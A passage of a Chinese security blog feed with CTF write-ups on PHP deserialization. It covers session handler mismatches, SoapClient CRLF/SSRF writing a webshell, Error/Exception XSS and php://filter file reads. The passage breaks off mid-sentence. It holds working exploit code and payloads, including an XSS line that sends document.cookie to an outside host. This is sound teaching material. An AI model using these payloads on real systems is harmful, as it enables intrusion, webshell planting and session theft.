class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>再构造exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz=<span class="string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>修改文件内容：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611121136.png" alt=""></p>
<p>从phpinfo中可以看到网站的根目录在<code>/opt/lampp/htdocs</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611121239.png" alt=""></p>
<p>file_get_contents()读取文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611121429.png" alt=""></p>
<h3 id="新春战役2020-hackme">新春战役2020 hackme</h3>
<p>贴上出题的kaixin师傅的writeup：<a href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p>
<p>没有复现环境，这里就主要说考察到的知识点：</p>
<h4 id="PHP-Session反序列化">PHP Session反序列化</h4>
<p><code>profile.php</code>中<code>session.serialize_handler</code>用的是<code>php</code>，而<code>init.php</code>中设置的是<code>php_serialize</code>，这样就可以参考前面提到的PHP Session反序列化漏洞。</p>
<h4 id="data协议以及4字命令注入">data协议以及4字命令注入</h4>
<p><a href="https://www.secpulse.com/archives/67064.html">挖洞技巧：如何绕过URL限制</a></p>
<p><a href="https://www.anquanke.com/post/id/87203">【CTF 攻略】如何绕过四个字符限制getshell</a></p>
<p>这个考点需要另外写一篇整理一下。</p>
<h2 id="0x04-Reference">0x04 Reference</h2>
<table>
<thead>
<tr>
<th>Title</th>
<th>Url</th>
</tr>
</thead>
<tbody>
<tr>
<td>带你走进PHP session反序列化漏洞</td>
<td><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></td>
</tr>
<tr>
<td>PHP反序列化总结</td>
<td><a href="https://www.cnblogs.com/tr1ple/p/11156279.html#sna43nW4">https://www.cnblogs.com/tr1ple/p/11156279.html#sna43nW4</a></td>
</tr>
<tr>
<td>PHP反序列化入门之session反序列化</td>
<td><a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PHP%E7%9A%84session%E6%9C%BA%E5%88%B6">https://mochazz.github.io/2019/01/29/PHP反序列化入门之session反序列化/#PHP的session机制</a></td>
</tr>
<tr>
<td>GYCTF Hackme</td>
<td><a href="http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/#Hackme">http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/#Hackme</a></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化学习——原生类利用</title>
    <url>/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="从两道CTF题目学习PHP原生类反序列化利用">从两道CTF题目学习PHP原生类反序列化利用</h1>
<p>文章围绕着一个问题，如何在原本的代码中找不到pop链的时候，通过原生类构造反序列化漏洞？</p>
<p>主要是两个原生类：</p>
<ul>
<li>SoapClient</li>
<li>Error（PHP7）或Exception（PHP5和7）</li>
</ul>
<h2 id="SoapClient-CLRF-SSRF">SoapClient + CLRF +SSRF</h2>
<p>题目：2018LCTF Bestphp’s revenge</p>
<blockquote>
<p>SoapClient类 用来提供和使用 webservice。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public SoapClient::SoapClient(mixed $wsdl[,array$options])</span><br></pre></td></tr></table></figure>
<p>第一个参数为WSDL 文件的 URI ，如果是NULL 意味着不使用 WSDL 模式。</p>
<p>第二个参数是一个数组，如果在WSDL 模式下，这个参数是可选的。如果在non-WSDL 模式下，必须设置location 和 uri 参数，location是要请求的 URL，uri是要访问的资源。</p>
<p>在官方文档中可以看到，它的user_agent 参数是可以控制 HTTP头部的 User-Agent 的。而在HTTP 协议中，header 与body 是用两个 <code>\r\n</code>分隔的，浏览器也是通过这两个 \r\n来区分 header 和body 的。</p>
<blockquote>
<p>The <em>user_agent</em> option specifies string to use in <em>User-Agent</em> header.</p>
</blockquote>
<p>demo：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a= <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:20000/&#x27;</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">$x= newSoapClient(<span class="literal">NULL</span>,$a);</span><br><span class="line">$y= serialize($x);</span><br><span class="line">$z= unserialize($y);</span><br><span class="line">$z-&gt;no_func();</span><br></pre></td></tr></table></figure>
<p>监听本地的20000端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:20000</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP&#x2F;5.5.9-1ubuntu4.29</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;utf-8</span><br><span class="line">SOAPAction: &quot;user#no_func&quot;</span><br><span class="line">Content-Length: 371</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:ns1&#x3D;&quot;user&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:SOAP-ENC&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot; SOAP-ENV:encodingStyle&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:no_func&#x2F;&gt;&lt;&#x2F;SOAP-ENV:Body&gt;&lt;&#x2F;SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>
<p>看这个POST的请求，发现有两个地方是可控的，<code>User-Agent</code>和 <code>SOAPAction</code>，而且明显Content-Type 和 Content-Length 都在User-Agent 之下，用 wupco 师傅的payload 就能进行任意的 POST请求，这里要先 urldecode 才可以进行反序列化。</p>
<p><code>exp.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target= <span class="string">&#x27;http://127.0.0.1/test.php&#x27;</span>;</span><br><span class="line">$post_string= <span class="string">&#x27;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;</span>;</span><br><span class="line">$headers= <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;Cookie:admin=1&#x27;</span></span><br><span class="line">   );</span><br><span class="line">$b= <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length:&#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;peri0d&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa= serialize($b);</span><br><span class="line">$aaa= str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,$aaa);</span><br><span class="line">$aaa= str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"></span><br><span class="line">$x= unserialize(urldecode($aaa));</span><br><span class="line">$x-&gt;no_func();</span><br></pre></td></tr></table></figure>
<p><code>test.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">	@$a=$_POST[<span class="number">1</span>];</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样就可以成功写入<code>shell.php</code>。</p>
<h2 id="Error-Exception-XSS">Error/Exception + XSS</h2>
<p>题目：BJDCTF 2rd XSS之光</p>
<p>Git泄露，用GitHack dump下来：</p>
<p>只有一个<code>index.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>yds？？？杨大树？？？</p>
</blockquote>
<p>Error类就是php的一个内置类用于自动自定义一个<code>Error</code>，在php7的环境下可能会造成一个<code>xss</code>漏洞，因为它内置有一个<code>toString</code>的方法。</p>
<blockquote>
<p>Exception类跟Error类原理一样，但是也适用于PHP5</p>
</blockquote>
<p>我们先来验证一下：</p>
<p>POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>得到编码后的反序列化结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
<p>成功触发XSS。</p>
<p>也可以直接打cookie：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="string">&#x27;&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://f7ffa642-8f7f-4879-bc49-e75d26e7c2bc.node3.buuoj.cn/a?&quot;+escape(document.cookie);&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($s);</span><br></pre></td></tr></table></figure>
<h2 id="SimpleXMLElement">SimpleXMLElement</h2>
<p><a href="https://ca0y1h.top/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3/#SimpleXMLElementXXE%E6%BC%8F%E6%B4%9E">https://ca0y1h.top/code_audit/5.PHP代码审计学习——Day3/#SimpleXMLElementXXE漏洞</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化学习-字符逃逸</title>
    <url>/Web_security/php_related/6.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="从一道CTF题学习PHP反序列化的对象-字符逃逸">从一道CTF题学习PHP反序列化的对象/字符逃逸</h1>
]]></content>
  </entry>
  <entry>
    <title>PHP反序列化学习-CTF实战篇</title>
    <url>/Web_security/php_related/7.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CTF%E5%AE%9E%E6%88%98%E7%AF%87/</url>
    <content><![CDATA[<h1 id="PHP反序列化学习之CTF实战篇">PHP反序列化学习之CTF实战篇</h1>
<h2 id="网鼎杯2020-AreUserialz">网鼎杯2020 AreUserialz</h2>
<p>题目地址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<p>题目直接给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="弱类型比较">弱类型比较</h3>
<p>分析源码发现可以调用的魔术方法只有<code>__destruct</code>。而<code>$op=2</code>可以读文件，<code>$op=1</code>可以写文件，但是它把<code>$content</code>设置为0说明写这个操作是绝对实用不了了。那么我们把目光放在读文件上。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接弱类型比较设置<code>$op=2</code>就完事了。然后本来以为可以直接构造<code>pop</code>链开始读文件的。但是遇到了下面的函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本来这里是没有什么问题的，但是因为你的变量是<code>protected</code>类型的，所以会产生<code>%00</code>字符，从而导致绕过失败。</p>
<h3 id="绕过is-valid">绕过is_valid()</h3>
<p>这里有两种绕过方法：</p>
<p>1.可以将<code>protected</code>类型的变量设置为<code>public</code>类型（PHP 7.0以上）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
<p>2.反序列化之前会做逐字判断，ascii必须&gt;=32或&lt;=125。由于这里是<code>protected</code>类型，需要加上%00进行标识，但是%会被过滤，就用十六进制\00和S来绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = urlencode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
<p>然后将payload中的<code>%00</code>替换为<code>\00</code>，<code>s</code>替换为<code>S</code>就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;s:11:&quot;\00*\00filename&quot;;s:71:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>但是用这种方法不能在https://www.ctfhub.com/#/challenge靶机上解题，也拿不到web目录的绝对路径，先留个坑。</p>
<h2 id="ZJCTF2019-逆转思维">ZJCTF2019 逆转思维</h2>
<p>题目地址：<a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></p>
<p>直接给出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="file-get-contents绕过">file_get_contents绕过</h3>
<p>有两种方式绕过：</p>
<ol>
<li>使用php://input伪协议绕过<br>
① 将要GET的参数?xxx=php://input<br>
② 用post方法传入想要file_get_contents()函数返回的值</li>
<li>用data://伪协议绕过<br>
将url改为：?xxx=data://text/plain;base64，想要file_get_contents()函数返回的值的base64编码<br>
或者将url改为：?xxx=data:text/plain,(url编码的内容)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="读取useless-php">读取useless.php</h3>
<p>题目有第二个参数file，大概是include()这个file，题目提示我们要包含useless.php，同时有一个判断是file参数不能传入flag，也就是我们不能直接包含flag.php。</p>
<p>利用php://filter协议读取这个useless.php，构造payload读取useless.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>useless.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;HAHAHAHAHA&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="反序列化">反序列化</h3>
<p>useless.php的魔术方法是<code>__toString()</code>，刚好可以使用<code>echo $password</code>触发这个魔术方法。</p>
<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> Flag();</span><br><span class="line">$s = serialize($o);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>综合起来的payload就是：</p>
